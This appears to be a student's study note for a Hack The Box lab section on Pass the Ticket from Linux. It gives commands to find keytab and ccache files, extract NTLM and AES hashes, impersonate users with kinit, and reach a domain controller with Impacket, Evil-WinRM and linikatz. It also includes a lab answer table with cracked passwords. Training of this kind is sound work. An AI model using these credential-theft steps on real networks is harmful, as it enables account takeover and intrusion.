# NOTE — Pass the Ticket (PtT) from Linux

## ID
528

## Module
Password Attacks

## Kind
methodology

## Title
Section 22 — Pass the Ticket (PtT) from Linux

## Description
Find ccache/keytab files on a domain-joined Linux box, extract hashes from keytabs (keytabextract), impersonate users via `kinit`, and use the resulting Kerberos credentials with Impacket, Evil-WinRM, and smbclient.

## Tags
ptt, linux, kerberos, keytab, ccache, kinit, klist, sssd, realm, linikatz, keytabextract, krb5ccname

## Commands
- `realm list`
- `klist`
- `env | grep -i krb5`
- `find / -name *keytab* -ls 2>/dev/null`
- `ls -la /tmp` (find ccache files)
- `klist -k -t <keytab>`
- `kinit <user>@<REALM> -k -t <keytab>`
- `python3 /opt/keytabextract.py <keytab>`
- `export KRB5CCNAME=/path/to/ccache`
- `smbclient //dc/share -k -c ls -no-pass`
- `impacket-wmiexec <dc> -k -no-pass`
- `evil-winrm -i <dc> -r <domain>`
- `impacket-ticketConverter <in> <out>` (.ccache ↔ .kirbi)
- `linikatz.sh`

## Concept Overview
Linux can be Kerberos-joined to Active Directory via `realmd` + `sssd` (or `winbind`). When joined:
- The machine has a keytab at `/etc/krb5.keytab` (machine account)
- Users that log in get their own ccache at `/tmp/krb5cc_<UID>_<random>`
- Scripts/services may use additional keytabs to authenticate as service accounts

If you can read those files (or own root), you inherit those Kerberos identities.

## File Formats

| File | Purpose | Location |
|------|---------|----------|
| **ccache** | Active user ticket cache | `/tmp/krb5cc_<UID>_<random>` (path stored in `$KRB5CCNAME`) |
| **keytab** | Hash-equivalent — used to mint new tickets without a password prompt | `*.keytab` (no fixed location), `/etc/krb5.keytab` (machine) |

## Identifying a Domain-Joined Linux Host

### `realm`
```bash
realm list
```
Look for `configured: kerberos-member`. The `permitted-logins`/`permitted-groups` lines tell you which AD users/groups can authenticate locally.

### Fallback (no `realm`)
```bash
ps -ef | grep -i "winbind\|sssd"
ls /etc/krb5.conf
ls /var/lib/sss/db/ 2>/dev/null
```

## Finding Kerberos Material

### Keytab files
```bash
find / -name *keytab* -ls 2>/dev/null
```
Hits:
- `/etc/krb5.keytab` — machine account (root-only)
- `*.keytab` / `*.kt` in user/script directories
- Look at cronjobs to find non-obvious keytab paths

### ccache files
Default location `/tmp`. Format `krb5cc_<UID>_<random>`. The current shell's path lives in `$KRB5CCNAME`:
```bash
env | grep -i krb5
ls -la /tmp | grep krb5cc
```
ccache files are owned by their user and mode 600 — root or that user can read them.

## Using a Keytab

### Inspect contents (no auth needed)
```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

### Authenticate as the principal
```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
- `-k` use a keytab
- `-t` keytab path
- Principal *is* case-sensitive (lowercase user, uppercase realm by convention)

After `kinit`, `klist` shows a fresh TGT and you can run any Kerberos-aware tool as that user.

### Extract hashes from a keytab (for cracking or PtH)
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
Outputs the NTLM, AES-128, and AES-256 hashes. The NTLM is the easiest to crack (try [crackstation.net](https://crackstation.net) first), the AES keys allow Overpass-the-Hash.

## Using a ccache (Existing Ticket)
```bash
cp /tmp/krb5cc_647401106_I8I133 /root/julio.ccache
export KRB5CCNAME=/root/julio.ccache
klist            # confirm
```
Then any Kerberos-aware tool will auth as that user automatically.

## Using Kerberos with Pentest Tools

Both Impacket and Evil-WinRM require `/etc/krb5.conf` configured for the target realm. Append:
```ini
[libdefaults]
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```
Plus `/etc/hosts`:
```
10.x.x.x  dc01.inlanefreight.htb dc01
```

### smbclient
```bash
smbclient //dc01/carlos -k -c ls -no-pass
```
- `-k` use Kerberos auth
- `-no-pass` don't prompt for password

### Impacket
```bash
impacket-wmiexec dc01 -k -no-pass
impacket-secretsdump -k -no-pass dc01.inlanefreight.htb
```
Target *must* be a hostname matching the SPN, not a raw IP.

### Evil-WinRM
Requires the `krb5-user` package installed.
```bash
sudo apt install krb5-user -y
evil-winrm -i dc01 -r inlanefreight.htb
```

## Ticket Format Conversion
```bash
# .ccache → .kirbi (use the file on Windows)
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# .kirbi → .ccache (use a Windows-extracted ticket on Linux)
impacket-ticketConverter julio.kirbi julio.ccache
```

## linikatz — Mass Credential Collection
Linux equivalent of Mimikatz for AD-joined boxes. Requires root.
```bash
sudo /opt/linikatz.sh
```
Dumps:
- Keytabs (FreeIPA, SSSD, Samba, VAS, PBIS)
- ccache files (all users)
- Cached hashes (from SSSD)
- Machine + user Kerberos tickets

Output deposited in `linikatz.<random>/` with separate ccache, keytab, hash subfolders.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Flag in David's home directory | **(hidden — see HTB walkthrough)** | `ssh david@inlanefreight.htb@<ip> -p 2222`, `cat ~/flag.txt` |
| Q2 — Which group can connect to LINUX01 | **(hidden)** | `realm list` — read `permitted-groups` |
| Q3 — Keytab file with read+write access | **`carlos.keytab`** | `find / -name *keytab* -ls 2>/dev/null` — only `/opt/specialfiles/carlos.keytab` is world-writable |
| Q4 — Carlos's password (crack NTLM from keytab) | **(hidden — `Password5`)** | `python3 /opt/keytabextract.py carlos.keytab`, crack NTLM via crackstation, then `su - carlos@inlanefreight.htb` to read flag |
| Q5 — svc_workstations password / flag | **(hidden — `Password4`)** | As Carlos, follow cron → `~/.scripts/svc_workstations._all.kt` → keytabextract → crack NTLM → SSH as svc_workstations |
| Q6 — Flag in `/root/flag.txt` | **(hidden)** | `sudo -l` shows ALL → `sudo su` → `cat /root/flag.txt` |
| Q7 — Read `\\DC01\julio\julio.txt` using Julio's ccache | **(hidden)** | Copy `/tmp/krb5cc_647401106_*`, `export KRB5CCNAME=...`, `smbclient //dc01/julio -k -c 'get julio.txt' -no-pass` |
| Q8 — Read `\\DC01\linux01\flag.txt` using LINUX01$ keytab | **(hidden)** | `kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab`, then `smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass` |

## Key Takeaways
- A Linux box's `/etc/krb5.keytab` is the *machine account*'s identity — useful for machine-context attacks.
- ccache files in `/tmp` are mode 600. Root reads them all; regular users only their own.
- Keytab + `kinit` = act as that principal without ever knowing the password.
- `keytabextract` produces NTLM that's often trivially crackable via crackstation rainbow tables.
- Many tools want the target as a *hostname matching its SPN*, not an IP. Use FQDNs.
- `impacket-ticketConverter` is the bridge between Linux (`.ccache`) and Windows (`.kirbi`) — same ticket, different format.

## Gotchas
- `kinit` is case-sensitive about the principal. Mismatched case = "client not found in database".
- Without proper `/etc/krb5.conf` and `/etc/hosts`, all Kerberos auth fails silently or with `KDC has no support for encryption type`.
- `linikatz.sh` requires root and writes to the current directory — run from a writable location.
- Some Linux Kerberos implementations prefix ccache paths with `FILE:` in `$KRB5CCNAME` — strip it before copying.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[21-pass-the-ticket-from-windows]] | [[23-pass-the-certificate]] →
<!-- AUTO-LINKS-END -->
